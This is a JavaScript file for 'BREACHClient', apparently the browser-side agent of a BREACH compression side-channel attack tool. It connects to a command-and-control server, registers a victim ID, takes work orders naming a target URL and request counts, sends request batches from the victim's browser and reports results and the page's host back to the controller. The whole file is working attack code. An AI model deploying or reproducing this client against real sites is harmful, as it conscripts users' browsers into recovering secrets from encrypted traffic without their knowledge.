const io = require('socket.io-client'),
      req = require('./request.js'),
      config = require('./config.js');

var BREACHClient = {
    ONE_REQUEST_TIMEOUT: 5000,
    MORE_WORK_TIMEOUT: 10000,
    _socket: null,
    init() {
        var flag = 0;
        this._socket = io.connect(config.COMMAND_CONTROL_URL);
        this._socket.on('connect', () => {
            console.log('Connected');
	     this.noWork(flag);
        });
        this._socket.on('do-work', (work) => {
            console.log('do-work message');
            this.doWork(work);
        });
        this._socket.on('server-hello', () => {
            this.getWork();
            console.log('Initialized');
	 });
        this._socket.on('server-nowork', () => {
            this.noWork(flag);
        });
    },
    noWork(flag) {
	if (flag == 0) {
            flag = 1;
            this._socket.emit('client-hello', {
		victim_id: config.VICTIM_ID
            });
	}
	else {
            console.log('No work');
            setTimeout(
                () => {
                    this._socket.emit('client-hello', {
                        victim_id: config.VICTIM_ID
                    })
                },
                this.MORE_WORK_TIMEOUT
            );
	}
    },
    doWork(work) {
        var {url, amount, alignmentalphabet} = work;

        // TODO: rate limiting
        if (typeof url == 'undefined') {
            this.noWork();
            return;
        }
        console.log('Got work: ', work);

        const reportCompletion = (success) => {
            if (success) {
                console.log('Reporting work-completed to server');
            }
            else {
                console.log('Reporting work-completed FAILURE to server');
            }

            this._socket.emit('work-completed', {
                work: work,
                success: success,
                host: window.location.host
            });
        }
        req.Collection.create(
            url,
            {amount: amount, alignmentalphabet: alignmentalphabet},
            function() {},
            reportCompletion.bind(this, true),
            reportCompletion.bind(this, false)
        );
    },
    getWork() {
        console.log('Getting work');
        this._socket.emit('get-work');
    }
};


BREACHClient.init();
